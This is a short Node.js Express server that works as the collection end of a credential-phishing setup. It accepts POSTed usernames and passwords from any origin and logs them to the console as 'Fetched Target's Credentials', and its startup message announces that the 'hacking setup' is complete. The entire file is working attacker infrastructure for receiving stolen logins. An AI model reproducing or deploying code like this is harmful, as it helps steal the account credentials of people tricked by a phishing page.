const express = require('express')
const app = express()
const cors = require('cors')
const chalk = require('chalk')

const port = 4000

app.use(express.json())
app.use(cors())

app.post('/', (req, res) => {

    console.log(chalk.yellow("Fetched Target's Credentials:"))
    console.log("\tusername:", chalk.red(req.body.username));
    console.log("\tpassword:", chalk.red(req.body.password));
    console.log("\n\n");


    res.json({
        hello: 'Hello World!'
    })
})

app.listen(port, () => {
  console.log(chalk.green(`Hacking setup complete at port:${port}\n`))
})